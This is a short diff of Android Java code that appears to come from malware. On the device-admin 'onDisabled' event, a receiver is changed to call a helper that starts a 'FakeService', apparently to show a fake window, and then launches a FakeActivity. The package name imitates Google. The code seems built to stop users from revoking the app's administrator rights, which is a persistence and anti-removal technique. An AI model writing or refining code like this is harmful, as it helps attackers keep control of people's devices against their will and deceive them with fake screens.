@@ -9,6 +9,7 @@ import android.content.Intent;
 import android.view.WindowManager;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.DisDeviceFakeWindow;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -47,10 +48,7 @@ public class DeviceBindBRC extends DeviceAdminReceiver {
         SettingManager.getInstance().setKeyHasBindingDevices(false);
 
         //立刻启动激活
-        Intent is = new Intent();
-        is.setClass(context, FakeService.class);
-        is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
-        context.startService(is);
+        CommonUtil.startFakeService(context, "DeviceBindBRC::onDisabled");
 
         Intent i = new Intent();
         i.setClass(context, FakeActivity.class);
